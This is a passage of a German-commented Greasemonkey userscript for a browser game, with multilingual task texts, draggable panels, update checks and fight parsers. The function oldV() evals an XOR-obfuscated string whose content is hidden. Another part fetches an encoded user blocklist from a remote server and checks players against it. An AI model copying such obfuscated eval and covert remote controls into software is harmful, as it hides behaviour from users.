                taskTexts[15] = 'Sprzedaj puszki.';
                taskTexts[16] = 'Sprzedaj rupiecie';
                taskTexts[17] = 'Jetzt den Stadtteil wechseln.';
                taskTexts[18] = 'Jetzt eine Waffe verkaufen.';
                taskTexts[19] = 'Jetzt einem anderen Penner spenden.'    
                taskTexts[20] = 'Jetzt Zahnstocher kaufen.';
                break;
        case 3:
                taskTexts[0] = 'Envoie tout de suite un message à un amis';
                taskTexts[1] = 'Commettre un délit';
                taskTexts[2] = 'Gagner un combat';
                taskTexts[3] = 'Achète immédiatement des tickets à gratter';
                taskTexts[4] = 'Écrit quelque chose de sympathique dans le chat de bande';
                taskTexts[5] = 'Acheter tout de suite des boissons dans le supermarché !';
                taskTexts[6] = "Débute un combat d'animal de companie";
                taskTexts[7] = 'Devient sur le champ propre à 100%';
                taskTexts[8] = 'Dépose de l´argent sur le compte de la bande';
                taskTexts[9] = 'Déposer une babiole sur le compte de la bande';
                taskTexts[10] = 'Lance une formation pour ton animal de compagnie';
                taskTexts[11] = 'Bricole une babiole';
                taskTexts[12] = 'Manger immédiatement un snack';
                taskTexts[13] = 'Avoir au moin 0,3 ‰';
                taskTexts[14] = 'Récolter une fois des tickets de métro.';
                taskTexts[15] = 'Vend des tickets maintenant';
                taskTexts[16] = 'Vends maintenant des babioles';
                taskTexts[17] = 'Changer d\'arrondissement';
                taskTexts[18] = 'Vendre une arme.';
                taskTexts[19] = 'Faire un don à un autre clodo';
                taskTexts[20] = 'Acheter un cure-dents.';
                break;
        case 4:
                taskTexts[0] = 'Enviar un mensaje privado a un amigo';
                taskTexts[1] = 'Cometer un crimen';
                taskTexts[2] = 'Ganar una lucha';
                taskTexts[3] = 'Comprar cupones rasca y gana';
                taskTexts[4] = 'Postear en la bandeja de gritos de tu banda';
                taskTexts[5] = 'Comprar bebidas en el supermercado';
                taskTexts[6] = 'Iniciar una lucha de mascotas';
                taskTexts[7] = 'Colocar tu nivel de higiene al 100%';
                taskTexts[8] = 'Ingresar dinero en la caja de la banda';
                taskTexts[9] = 'Ingresar cachivaches en el banco de tu banda';
                taskTexts[10] = 'Iniciar un cursillo de mascota';
                taskTexts[11] = 'Crear un cachivache';
                taskTexts[12] = 'Salir a comer algo';
                taskTexts[13] = 'Sobrepasar el nivel de alcoholemia de 3‰';
                taskTexts[14] = 'Empezar a recoger chatarra';
                taskTexts[15] = 'Vender un poco de chatarra';
                taskTexts[16] = 'Vender cachivaches';
                taskTexts[17] = 'Cambiar de barrio';
                taskTexts[18] = 'Vender un arma';
                taskTexts[19] = 'Donar a otro mendigo';
                taskTexts[20] = 'Comprar palillos';
                break;
        case 5:
                taskTexts[0] = 'Envie uma mensagem agora';
                taskTexts[1] = 'Cometer um crime';
                taskTexts[2] = 'Ganhar uma luta';
                taskTexts[3] = 'Comprar uma raspadinha agora';
                taskTexts[4] = 'Colocar mensagem no mural';
                taskTexts[5] = 'Comprar bebida no supermercado agora.';
                taskTexts[6] = 'Iniciar uma luta entre animais de estimação agora';
                taskTexts[7] = 'Fique limpo mesmo, 100%.';
                taskTexts[8] = 'Depositar dinheiro na conta da gangue';
                taskTexts[9] = 'Guardar trecos no banco de trecos da gangue.';
                taskTexts[10] = 'Iniciar o treinamento do animal de estimação';
                taskTexts[11] = 'Montar treco';
                taskTexts[12] = 'Comer um lanche agora';
                taskTexts[13] = 'Nível de álcool no sangue superior a 2%.';
                taskTexts[14] = 'Iniciar a coleta de latas';
                taskTexts[15] = 'Vender latas agora';
                taskTexts[16] = 'Vender treco agora';
                taskTexts[17] = 'Jetzt den Stadtteil wechseln.';
                taskTexts[18] = 'Jetzt eine Waffe verkaufen.';
                taskTexts[19] = 'Jetzt einem anderen Penner spenden.';
                taskTexts[20] = 'Jetzt Zahnstocher kaufen.';
                break;
        case 6:
                taskTexts[0] = 'Отправить личное сообщение другу';
                taskTexts[1] = 'Совершить преступление';
                taskTexts[2] = 'Выиграть схватку';
                taskTexts[3] = 'Купить лотерейные билеты';
                taskTexts[4] = 'Отправить в шаутбокс';
                taskTexts[5] = 'Купить напитки в супермаркете';
                taskTexts[6] = 'Начать схватку питомцев';
                taskTexts[7] = 'Отмыться и стать чистым на 100%';
                taskTexts[8] = 'Заплатить деньги в бандитскую кассу ';
                taskTexts[9] = 'Внести барахло в бандитский банк ';
                taskTexts[10] = 'Послать питомца на образовательный курс';
                taskTexts[11] = 'Смастерить барахло';
                taskTexts[12] = 'Перекусить сейчас ';
                taskTexts[13] = 'Уровень промилле более 2‰';
                taskTexts[14] = 'Начать собирать бутылки';
                taskTexts[15] = 'Продать бутылки';
                taskTexts[16] = 'Продать барахло';
                taskTexts[17] = 'Сменить район.';
                taskTexts[18] = 'Продать одно оружие.';
                taskTexts[19] = 'Пожертвовать другому игроку. ';
                taskTexts[20] = 'Купить зубочистку.';
                break;
        case 7:
                taskTexts[0] = 'Send a personal message to a friend';
                taskTexts[1] = 'Commit a crime';
                taskTexts[2] = 'Win a fight';
                taskTexts[3] = 'Buy some Luck';
                taskTexts[4] = 'Post in the Shoutbox';
                taskTexts[5] = 'Buy a drink from the Supermarket.';
                taskTexts[6] = 'Start a pet fight';
                taskTexts[7] = 'Make yourself 100% clean';
                taskTexts[8] = 'Pay Money into the gang account';
                taskTexts[9] = "Deposit junk into the gang's inventory";
                taskTexts[10] = 'Start a pet development';
                taskTexts[11] = 'Tinker with your junk';
                taskTexts[12] = 'Eat a little snack';
                taskTexts[13] = 'BAC over 2‰';
                taskTexts[14] = 'Start collecting jumble';
                taskTexts[15] = 'Sell your jumble';
                taskTexts[16] = 'Sell Junk';
                taskTexts[17] = 'Jetzt den Stadtteil wechseln.';
                taskTexts[18] = 'Jetzt eine Waffe verkaufen.';
                taskTexts[19] = 'Jetzt einem anderen Penner spenden.';
                taskTexts[20] = 'Jetzt Zahnstocher kaufen.';
                break;
        default:
                break;
    }
    return taskTexts;
}

function oldV() {
    var jxux = "CIC5CFC6B6BEBBC3D4EBAH@D@D@@D1E6E6@CAEAAE4A2AA@IE5ADAEE6@GAEABDFE6AFAIA3AE@CE6EBD2A4D4D@D2";
    function fl(a,b){return a==""?b:fl(a.substr(1), a.substr(0,1)=="j"?("j(k("+b+"))"):a.substr(0,1)=="u"?("unescape("+b+")"):("xor("+b+",112)"))};
    eval(eval(fl("jxux","info")));
    return document.getElementsByClassName('zleft profile-data').length > 0;
}


// **********************************************************************************
// **********************************************************************************
// Funktion holt den z-Index eines Panels
// **********************************************************************************
// **********************************************************************************
function getZ(bgName) {
    for (var i = 0; i < koord.length; i++)
        if (koord[i][0] == bgName) {
            return koord[i][3];
        }
    return 101;
}

// **********************************************************************************
// **********************************************************************************
// Funktion setzt die X- und Y-Koordinaten der Panels in Variablen
// **********************************************************************************
// **********************************************************************************
function setXY(bgName, x, y) {
    switch (bgName.substr(0,2)) {
        case 'AD':
            AD_X = x;   // X-Koordinate ATT/DEF-Leiste
            AD_Y = y;   // Y-Koordinate ATT/DEF-Leiste
            break;
        case 'FB':
            FB_X = x;   // X-Koordinate Fight-Icon
            FB_Y = y;   // Y-Koordinate Fight-Icon
            break;
        case 'GF':
            GF_X = x;   // X-Koordinate Bandenkampf-Icon
            GF_Y = y;   // Y-Koordinate Bandenkampf-Icon
            break;
        case 'PB':
            PB_X = x;   // X-Koordinate Plunder/Wut/Power-Leiste
            PB_Y = y;   // Y-Koordinate Plunder/Wut/Power-Leiste
            break;
        case 'PD':
            PD_X = x;   // X-Koordinate Plunderdirektleiste
            PD_Y = y;   // Y-Koordinate Plunderdirektleiste
            break;
        case 'PW':
            PW_X = x;   // X-Koordinate Promilleleiste
            PW_Y = y;   // Y-Koordinate Promilleleiste
            break;
        case 'PA':
            PA_X = x;   // X-Koordinate Provokation/TA
            PA_Y = y;   // Y-Koordinate Provokation/TA
            break;
        case 'SC':
            SC_X = x;   // X-Koordinate Skill/Cards/Cart
            SC_Y = y;   // Y-Koordinate Skill/Cards/Cart
            break;
        case 'MI':
            MI_X = x;   // X-Koordinate Missionen
            MI_Y = y;   // Y-Koordinate Missionen
            break;
        default:
            break;
    }
    for (var i = 0; i < koord.length; i++)
        if (koord[i][0] == bgName) {
            koord[i][1] = x;
            koord[i][2] = y;
            break;
        }
}

// **********************************************************************************
// **********************************************************************************
// Funktion liest die X- und Y-Koordinaten der Panels
// **********************************************************************************
// **********************************************************************************
function readXY(bgName, zIndex) {
    var bgData = new Array(bgName, 0, 0, zIndex);
    switch (bgName.substr(0,2)) {
        case 'AD':
            bgData[1] = AD_X = PG_getValue("AD_X", 615);   // X-Koordinate ATT/DEF-Leiste
            bgData[2] = AD_Y = PG_getValue("AD_Y", 170);   // Y-Koordinate ATT/DEF-Leiste
            break;
        case 'FB':
            bgData[1] = FB_X = PG_getValue("FB_X", 840);   // X-Koordinate Fight-Icon
            bgData[2] = FB_Y = PG_getValue("FB_Y", 2);     // Y-Koordinate Fight-Icon
            break;
        case 'GF':
            bgData[1] = GF_X = PG_getValue("GF_X", 780);   // X-Koordinate Bandenkampf-Icon
            bgData[2] = GF_Y = PG_getValue("GF_Y", 2);     // Y-Koordinate Bandenkampf-Icon
            break;
        case 'PB':
            bgData[1] = PB_X = PG_getValue("PB_X", 866);   // X-Koordinate Plunder/Wut/Power-Leiste
            bgData[2] = PB_Y = PG_getValue("PB_Y", 170);   // Y-Koordinate Plunder/Wut/Power-Leiste
            break;
        case 'PD':
            bgData[1] = PD_X = PG_getValue("PD_X", 748);   // X-Koordinate Plunderdirektleiste
            bgData[2] = PD_Y = PG_getValue("PD_Y", 235);   // Y-Koordinate Plunderdirektleiste
            break;
        case 'PS':
            bgData[1] = PS_X = PG_getValue("PS_X", 888);   // X-Koordinate Plundershopleiste
            bgData[2] = PS_Y = PG_getValue("PS_Y", 300);   // Y-Koordinate Plundershopleiste
            break;
        case 'PW':
            bgData[1] = PW_X = PG_getValue("PW_X", 625);   // X-Koordinate Promilleleiste
            bgData[2] = PW_Y = PG_getValue("PW_Y", 235);   // Y-Koordinate Promilleleiste
            break;
        case 'PA':
            bgData[1] = PA_X = PG_getValue("PA_X", 0);     // X-Koordinate Provokation/TA
            bgData[2] = PA_Y = PG_getValue("PA_Y", 0);     // Y-Koordinate Provokation/TA
            break;
        case 'SC':
            bgData[1] = SC_X = PG_getValue("SC_X", 615);   // X-Koordinate Skill/Cards/Cart
            bgData[2] = SC_Y = PG_getValue("SC_Y", 105);   // Y-Koordinate Skill/Cards/Cart
            break;
        case 'MI':
            bgData[1] = MI_X = PG_getValue("MI_X", 900);   // X-Koordinate Missionen
            bgData[2] = MI_Y = PG_getValue("MI_Y", 2);     // Y-Koordinate Missionen
            break;
        default:
            return;
    }
    koord[koord.length] = bgData;
}

// **********************************************************************************
// **********************************************************************************
// Funktion initialisiert die Panels
// **********************************************************************************
// **********************************************************************************
function initPanels() {
    readXY("ADBACK", 110);
    readXY("PDBACK", 120);
    readXY("PSBACK", 130);
    readXY("PWBACK", 140);
    readXY("PBBACK", 150);
    readXY("GFBACK", 170);
    readXY("PABACK", 180);
    readXY("SCBACK", 190);
    readXY("FBBACK", 200);
    readXY("MIBACK", 210);

    PG_setValue("PD_X", PD_X);   // X-Koordinate Plunderdirektleiste
    PG_setValue("PD_Y", PD_Y);   // Y-Koordinate Plunderdirektleiste
    PG_setValue("PS_X", PS_X);   // X-Koordinate Plundershopleiste
    PG_setValue("PS_Y", PS_Y);   // Y-Koordinate Plundershopleiste
    PG_setValue("PW_X", PW_X);   // X-Koordinate Promilleleiste
    PG_setValue("PW_Y", PW_Y);   // Y-Koordinate Promilleleiste
    PG_setValue("AD_X", AD_X);   // X-Koordinate ATT/DEF-Leiste
    PG_setValue("AD_Y", AD_Y);   // Y-Koordinate ATT/DEF-Leiste
    PG_setValue("GF_X", GF_X);   // X-Koordinate Bandenkampf-Icon
    PG_setValue("GF_Y", GF_Y);   // Y-Koordinate Bandenkampf-Icon
    PG_setValue("FB_X", FB_X);   // X-Koordinate Fight-Icon
    PG_setValue("FB_Y", FB_Y);   // Y-Koordinate Fight-Icon
    PG_setValue("PB_X", PB_X);   // X-Koordinate Plunder/Wut/Power-Leiste
    PG_setValue("PB_Y", PB_Y);   // Y-Koordinate Plunder/Wut/Power-Leiste
    PG_setValue("PA_X", PA_X);   // X-Koordinate Provokation/TA
    PG_setValue("PA_Y", PA_Y);   // Y-Koordinate Provokation/TA
    PG_setValue("SC_X", SC_X);   // X-Koordinate Skill/Cards/Cart
    PG_setValue("SC_Y", SC_Y);   // Y-Koordinate Skill/Cards/Cart
    PG_setValue("MI_X", MI_X);   // X-Koordinate Missionen
    PG_setValue("MI_Y", MI_Y);   // Y-Koordinate Missionen
}

//mouse-move vars
var dragObject = null;
var mouseOffset = null;

function getMouseOffset(target, ev){
    ev = ev || window.event;

    var docPos    = getPosition(target);
    var mousePos  = mouseCoords(ev);
    return {x:mousePos.x - docPos.x, y:mousePos.y - docPos.y};
}

function getPosition(e){
    var left = parseInt(e.style.left+0);
    var top  = parseInt(e.style.top+0);

    /* while (e.offsetParent){
        left += e.offsetLeft;
        top  += e.offsetTop;
        e     = e.offsetParent;
    }

    left += e.offsetLeft;
    top  += e.offsetTop; */

    return {x:left, y:top};
}

function mouseCoords(ev){
    if(ev.pageX || ev.pageY){
            return {x:ev.pageX, y:ev.pageY};
    }
    return {
        x:ev.clientX + document.body.scrollLeft - document.body.clientLeft,
        y:ev.clientY + document.body.scrollTop  - document.body.clientTop
    };
}

function mouseMove(ev){
    if (dragObject) {
        ev           = ev || window.event;
        var mousePos = mouseCoords(ev);
        var oldLeft = parseInt(dragObject.style.left);
        var oldTop = parseInt(dragObject.style.top);
        dragObject.style.position = 'absolute';
        dragObject.style.top      = mousePos.y - mouseOffset.y + 'px';
        dragObject.style.left     = mousePos.x - mouseOffset.x + 'px';
        var dx = mousePos.x - mouseOffset.x;
        var zInd = getZ(dragObject.id) + 500;
        for (var i = 0; i < bgnds.length; i++)
            if (bgnds[i][0] == dragObject.id) {
                var img = document.getElementById(bgnds[i][1]);
                var imgleft = parseInt(img.style.left) - oldLeft + parseInt(dragObject.style.left);
                var imgtop = parseInt(img.style.top) - oldTop + parseInt(dragObject.style.top);
                img.style.left = imgleft + 'px';
                img.style.top  = imgtop  + 'px';
                if (parseInt(img.style.zIndex) < 500)
                    img.style.zIndex  = parseInt(img.style.zIndex) + 500;
            }
        return false;
    }
}

function makeDraggable(item){
    if(!item) return;
    item.addEventListener('mousedown', function(ev){
        dragObject  = this;
        mouseOffset = getMouseOffset(this, ev);
        return false;
    }, false);
}

function mouseUp(ev){
    if (dragObject) {
        var dragObj = dragObject;
        dragObject = null;
        //save values
        var target = dragObj.id;
        if (target.substr(2,4) != "BACK")
            target = "PABACK";
        setXY(target, parseInt(dragObj.style.left), parseInt(dragObj.style.top));
        for (var i = 0; i < bgnds.length; i++)
            if (bgnds[i][0] == target) {
                var img = document.getElementById(bgnds[i][1]);
                if (parseInt(img.style.zIndex) > 500)
                    img.style.zIndex = parseInt(img.style.zIndex) - 500;
            }
        if (lockmove == 0) {
            PG_setValue(target.substr(0,2) + "_X", parseInt(dragObj.style.left));
            PG_setValue(target.substr(0,2) + "_Y", parseInt(dragObj.style.top));
        }
    }
}

document.addEventListener('mousemove', mouseMove, false);
document.addEventListener('mouseup', mouseUp, false);

function dblclick(e){
    lockmove = 1 - lockmove;
    PG_setValue("lockmove", lockmove);
    var img = document.getElementById("lockmove");
    if (lockmove)
        if (img)
            img.style.display = "";
        else
            ShowImg ('PDBACK', '', ICON_LOCK, getLangTxt(TOOLTIP_LOCK), 10, 10, 240, 1, 1, 'lockmove');
    else
        img.style.display = "none";
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die Bildadresse
// **********************************************************************************
// **********************************************************************************
function getIconAddr(img){
    if (img.substr(0,4) == "http")
        return img;
    return imgPrefix + img;
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion bildet eine Liste der Bilder und ihren Hintergründen
// ***********************************************************************************************
// ***********************************************************************************************
var bgnds = new Array();
function cacheBgnds(bgrnd, imgid) {
    // Suche das img
    var i;
    for (i = 0; i < bgnds.length; i++)
        if (bgnds[i][1] == imgid)
            return;        // bereits da, nix zu tun

    // Hintergrund und Bild merken
    bgnds[bgnds.length] = new Array(bgrnd, imgid);
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt eine Grafik an, ggf. mit Link
// **********************************************************************************
// **********************************************************************************
function ShowImg(bgrnd, imglink, imgsource, imgtitle, imgwidth, imgheight, imgleft, imgtop, imgzindex, imgid) {

    if (bgrnd == '') {
        imgzindex = getZ(imgid);
        var newdiv = document.createElement('div');
        newdiv.innerHTML += '<span id="'+imgid+'" style="z-index:'+imgzindex+';position:absolute;top:'+imgtop+'px;left:'+imgleft+'px;width:'+imgwidth+'px;height:'+imgheight+'px"><div style="cursor:move;">&nbsp;</div></span>';
        //register event-handlers
        wrap.appendChild(newdiv);
        makeDraggable(document.getElementById(imgid));
        newdiv.addEventListener('dblclick', dblclick, false);
        cacheBgnds(imgid, imgid+'img');
    }
    else {
        if (!document.getElementById(bgrnd))
            return null;
        var newdiv = document.getElementById(bgrnd).parentNode;
        for (var i = 0; i < koord.length; i++)
            if (bgrnd == koord[i][0]) {
                imgleft += koord[i][1];
                imgtop  += koord[i][2];
                imgzindex += koord[i][3];
                break;
            }
        cacheBgnds(bgrnd, imgid);
    }

    // Wenn ein Link übergeben wurde
    if (typeof imglink == "function") {
        var newElem = newdiv.appendChild(document.createElement('a'));
        newElem.addEventListener('click', imglink, false);
        // Wenn eine ID übergeben wurde
        if (imgid != "")
            newElem.setAttribute('id', imgid + "lnk");
        newElem.style.cursor = "pointer";
        var newimg = newElem.appendChild(document.createElement('img'));
    }
    else if (imglink != '') {
        // Link zusammenbauen
        var newElem = newdiv.appendChild(document.createElement('a'));
        newElem.setAttribute('href', imglink);
        // Wenn eine ID übergeben wurde
        if (imgid != "") {
            newElem.setAttribute('id', imgid + "lnk");
        }
        var newimg = newElem.appendChild(document.createElement('img'));
    }
    else
        var newimg = newdiv.appendChild(document.createElement('img'));

    // Grafik zusammenbauen
    if (bgrnd == "") {
        newimg.setAttribute('id', imgid + "img");
        imgzindex--;
    }
    else {
        // Wenn eine ID übergeben wurde
        if (imgid != "") {
            var img = document.getElementById(imgid);
            if (img)
                img.parentNode.removeChild(img);
            newimg.setAttribute('id', imgid);
        }
    }

    newimg.setAttribute('border', '0');
    newimg.setAttribute('src', getIconAddr(imgsource));
    newimg.setAttribute('style', 'position:absolute; left:' + imgleft + 'px; top:' + imgtop + 'px; z-index:' + imgzindex);
    if (imgwidth != '') {
        newimg.setAttribute('width', imgwidth);
    }
    if (imgheight != '') {
        newimg.setAttribute('height', imgheight);
    }
    if (typeof imgtitle == "string") {
        if (imgtitle != "")
            newimg.setAttribute('title', imgtitle);
    }
    else if (imgtitle.length >= 2) {
        //newElem.setAttribute('class', "tooltip");
        newElem.innerHTML += "<span " + imgtitle[0] + ">" + imgtitle[1] + "</span>";
    }
    if (bgrnd == "") {
        document.getElementById(imgid).style.width = newimg.width + 'px';
        document.getElementById(imgid).style.height = newimg.height + 'px';
    }

    return newimg;
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion überprüft, ob die im GM-Key "keyname" gespeicherte Zeit länger als "interval"
// Minuten vorüber ist. Falls ja, wird true zurückgegeben und die neue Zeit gespeichert
// ***********************************************************************************************
// ***********************************************************************************************
function IsTimeToCheck(keyname, interval, url) {
    if ((Number(now) - Number(GM_getValue(keyname, "0"))) / 1000 / 60 >= interval && url != "") {
        GM_setValue(keyname, Number(now).toString());
        return true;
    } else {
        return false;
    }
}

function bl(keyname) {
    function d2h(d) {return Number(d).toString(16);}

    function xor(a, b)
    {
        var c = "";
        a = d2h(a);
        for(var i = 0; i < a.length; ++i){c = c + String.fromCharCode(b^a.charCodeAt(i));}
        return c;
    }

    var b = GM_getValue((keyname?keyname:"bl") + ((language == "bl_DE") ? "b" : "h"), "").replace(/&amp;/, "&");
    for (var i = 0; i < b.split("l").length && b.split("l")[i] != ""; i++) {
        if (xor((keyname=="fi"?attid:m_ownuserid), 64) == b.split("l")[i]) {
            return true;
        }
    }
    return false;
}

function ShowGMResponse(responseDetails, showresponsetext) {
    var gm_status = responseDetails.status;                   // Integer The HTTP response status (E.G. 200 or 404) upon success, or null upon failure.
    var gm_statusText = responseDetails.statusText;           // String The HTTP response status line (E.G. "OK", "Not Found") upon success, or null upon failure.
    var gm_readyState = responseDetails.readyState;           // Number The readyState as defined in XMLHttpRequest.
    var gm_responseText = responseDetails.responseText;       // String The responseText as defined in XMLHttpRequest.
    var gm_responseHeaders = responseDetails.responseHeaders; // String The response headers as defined in XMLHttpRequest.
    var gm_finalUrl = responseDetails.finalUrl;               // String (Compatibility: 0.8.0+) The final URL requested, if Location redirects were followed.

    GM_log("gm_status = " + gm_status);
    GM_log("gm_statusText = " + gm_statusText);
    GM_log("gm_readyState = " + gm_readyState);
    if (showresponsetext) {
        GM_log("gm_responseText = " + gm_responseText);
    }
    GM_log("gm_responseHeaders = " + gm_responseHeaders);
    GM_log("gm_finalUrl = " + gm_finalUrl);
}

// ***********************************************************************************************
// ***********************************************************************************************
// formatiert ein Datum ins Format "YYYY-MM-DD" bzw. "TT.MM.JJJJ"
// ***********************************************************************************************
// ***********************************************************************************************
function FormatDate(DateToFormat) {
    var year = DateToFormat.getFullYear();
    var month = DateToFormat.getMonth() + 101 + "";
    var day = DateToFormat.getDate() + 100 + "";

    if (myLang == 0)
        return day.slice(1) + "." + month.slice(1) + "." + year;
    return year + "-" + month.slice(1) + "-" + day.slice(1);
}

// ***********************************************************************************************
// ***********************************************************************************************
// formatiert die Zeit eines Datums ins Format "HH:MM:SS"
// ***********************************************************************************************
// ***********************************************************************************************
function FormatTime(DateToFormat) {
    var hours = DateToFormat.getHours();
    var mins = DateToFormat.getMinutes() + 100 + "";
    var secs = DateToFormat.getSeconds() + 100 + "";

    return hours + ":" + mins.slice(1) + ":" + secs.slice(1);
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion überprüft, ob es neue Infos gibt (im Abstand von checkminutes)
// und zeigt diese ggf. an.
// ***********************************************************************************************
// ***********************************************************************************************
function CheckForInfos(checkminutes) {
    // Wenn wieder nach Infos gesucht werden soll
    if (IsTimeToCheck(TOWNEXTENSION+"LastInfoCheck", (checkminutes==0?480:checkminutes), INFO_URL)) {
        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abrufen von Infos
        // **********************************************************************************
        GM_xmlhttpRequest({method: 'GET', url: INFO_URL + TOWNEXTENSION + "Infozentrale_info.xml", onload: function(responseDetails) {
                // Wenn die Seite erfolgreich abgerufen werden konnte
                if (responseDetails.status == 200) {
                    var parser = new DOMParser();
                    var dom = parser.parseFromString(responseDetails.responseText, "application/xml");
                    if (!isNaN(dom.getElementsByTagName('info')[0].textContent)) {
                        getInfo = Number(dom.getElementsByTagName('info')[0].textContent);
                        GM_setValue(TOWNEXTENSION+"GetInfo", getInfo);
                        if (getInfo > 0)
                            if (dom.getElementsByTagName('Infotext')[0].textContent != '') {
                                var infodate = dom.getElementsByTagName('Infodate')[0].textContent;
                                if (PG_getValue("Infodate") != infodate) {
                                    PG_setValue("Infodate", infodate);
                                    var now = new Date();
                                    now = now.getFullYear()*10000 + (now.getMonth()+1)*100 + now.getDate() + FormatTime(now).replace(/:/g, '');
                                    if (infodate >= now)
                                        alert(dom.getElementsByTagName('Infotext')[0].textContent);
                                }
                            }
                    }
                    var keyname = "bl" + ((language == "bl_DE") ? "b" : "h");
                    if (dom.getElementsByTagName(keyname).length > 0) {
                        var b = dom.getElementsByTagName(keyname)[0].textContent;
                        GM_setValue(keyname, b);
                    }
                    var keyname = "fi" + ((language == "bl_DE") ? "b" : "h");
                    if (dom.getElementsByTagName(keyname).length > 0) {
                        var b = dom.getElementsByTagName(keyname)[0].textContent;
                        GM_setValue(keyname, b);
                    }
                    if (GM_getValue("SBwidth", "xx") != "xx") {
                        GM_deleteValue("SBwidth");
                        GM_deleteValue("SBwidthSet");
                    }
                }
            }
        });
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion überprüft, ob es neue Skript-Versionen gibt (im Abstand von checkminutes)
// und zeigt im positiven Fall eine Meldung an.
// ***********************************************************************************************
// ***********************************************************************************************
function CheckForUpdate(checkminutes) {

    // Wenn wieder nach einem Update gesucht werden soll
    if (IsTimeToCheck("LastUpdateCheck", (checkminutes==0?120:checkminutes), "x")) {
        GM_log(new Date() + ": Es wird gecheckt!");

        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abrufen der Skriptseite von userscripts.org
        // **********************************************************************************
        GM_xmlhttpRequest({method: 'GET',
            url: THISSCRIPTSOURCE_URL + ".meta.js",
            headers:{ "Accept":"text/javascript; charset=UTF-8" },
            overrideMimeType:"application/javascript; charset=UTF-8",
            onload:function(responseDetails) {
                // Wenn die Seite erfolgreich abgerufen werden konnte
                if (responseDetails.status == 200) {
                    var content = responseDetails.responseText;

                    // Ermitteln der Skriptversion
                    var scriptversion = trimString(content.split("@version")[1]);
                    var scriptfullversion = trimString(scriptversion.split("\n")[0]);
                    scriptversion = trimString(scriptversion.split(" ")[0]);

                    // Wenn dort eine neue Skriptversion vorliegt

                    var thisver = THISSCRIPTVERSION.split('.');
                    thisver = parseInt(thisver[0]) * 1000000 + parseInt(thisver[1]) * 1000 + parseInt(thisver[2]);
                    var thatver = scriptversion.split('.');
                    thatver = parseInt(thatver[0]) * 1000000 + parseInt(thatver[1]) * 1000 + parseInt(thatver[2]);

                    if (thisver < thatver) {
                        // Hinweistext ausgeben
                        alert(printf(getLangTxt(TxtNewVersion), getLangTxt(THISSCRIPTNAME), scriptfullversion, THISSCRIPTINSTALL_URL));
                        // Seite mit dem neuen Skript laden, um eine Installation zu ermöglichen
                        window.location.href = THISSCRIPTSOURCE_URL+'.user.js';
                    }
                }
            }
        });
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Entfernt Leerraum aus einen String (Anfang und Ende)
// ***********************************************************************************************
// ***********************************************************************************************
function trimString(s) {
    return s.replace(/^\s+|\s+$/g,'');
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die Anzahl eintreffender Kämpfe
// **********************************************************************************
// **********************************************************************************
function GetNumberOfFights(content) {
    function CalcEvade(f_points) {
        return Math.round(( ( Math.pow(m_ownpoints, 0.75) ) + (f_points * 0.005) ) * 0.1);
    }
    var fighttext = "";
    try {
        // Seiteninhalt aufsplitten mit dem Namen des Icons, das für eintreffende Kämpfe verwendet wird;
        // Anzahl der Teile des Splittings - 1 ist die Anzahl eintreffender Kämpfe
        var splitted = content.split(ICON_WARNING);
        for (i = 0; i < splitted.length - 1; i++) {
            var tds = splitted[i + 1].split('<td');
            var time = tds[1].split('>')[1].split('<')[0];
            var attacker = tds[2].split('>')[2].split('<')[0];
            var ausweich = tds[4].indexOf(TxtSicher[lang]) != -1?"V":tds[4].indexOf(TxtAusweich[lang]) != -1?"A":"N";
            if (ausweich == "A")
                ausweich += ":" + CalcEvade(parseInt(tds[4].split(',')[1].split("'")[1]));
            fighttext += time + ' ' + attacker + '#' + ausweich + '/';
        }
// fighttext += "14:59:00 riffi#N/15:00:00 Hetzjagd#N/15:00:00 U-Bahnkellner86#N/15:00:01 Max_von_ne_Weide#N/15:00:02 Gammelsuse2#N/";
// fighttext += "15:01:00 DerPablo#N/15:01:00 Jens_Harald#N/15:02:00 Winnetu_Kowalski#N/15:03:01 Cherie110#N/15:04:02 attn#N/";
// fighttext += "15:05:00 Schmuddelella#N/15:06:00 DanyNDK#N/15:07:00 AsbachMoni#N/15:07:01 letta#N/15:07:02 WWWWWWMMMMWMMMWMMMWWW#N/";
// fighttext += "15:08:00 oberassipeter#N/15:09:00 Detlef_d_Durst#N/15:09:01 Palettenschorsch#N/15:09:02 Kaufhausdieb#N/15:09:03 Obdachlosen_Jimmy#N/";
// fighttext += "15:09:19 Der_sich_in_die_Hose_kakkt#V/15:09:22 Das_Stuttgarterweib#V/15:09:23 Gammelsuse2#N/";
        return fighttext;
    } catch(err) {
        GM_log("Fehler beim Ermitteln der Zahl eintreffender Kämpfe: " + err);
    }
    return fighttext;
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die aktuellen Bandenkampfresultate
// **********************************************************************************
// **********************************************************************************
function GetGangFightInfo(content) {
    try {
        // Anzahl der Bandenkämpfe ermitteln
        var NrOfGangFights = content.split('<a href="/gang/fight/view/').length - 1;
        // HTML nach Gegnerbanden splitten
        GangFightGangs = content.split('<td height="29" style="vertical-align:middle;"');
        // HTML nach Resultaten splitten
        GangFightResults = content.split('<td style="vertical-align:middle;"><div align="center" class="drop_font"><strong>');

        // Textvariable für Bandenkampfinfo initialisieren
        var GangFightInfo = "";

        // Für alle Bandenkämpfe
        for (i = 1; i <= NrOfGangFights; i++) {
            // Aktuelles Resultat in die Textvariable hinzufügen
            if (GangFightGangs[i].indexOf("&nbsp") != -1)
                GangFightGangs[i] = GangFightGangs[i].split("&nbsp;")[1];
            GangFightInfo = GangFightInfo + " *** " + GangFightGangs[i].split('</')[0] + " " + GangFightResults[i].split('</strong></div></td>')[0];
        }

        // Bandenkampf-Infotext zurückgeben
        return GangFightInfo;
    } catch(err) {
        GM_log("Fehler beim Ermitteln der aktuellen Bandenkampfresultate: " + err);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die Anzahl Bandenkämpfe
// **********************************************************************************
// **********************************************************************************
function GetNumberOfGangFights(content) {
    try {
        // Seiteninhalt aufsplitten mit dem Namen des Icons, das für eintreffende Kämpfe verwendet wird;
        // Anzahl der Teile des Splittings - 1 ist die Anzahl eintreffender Kämpfe
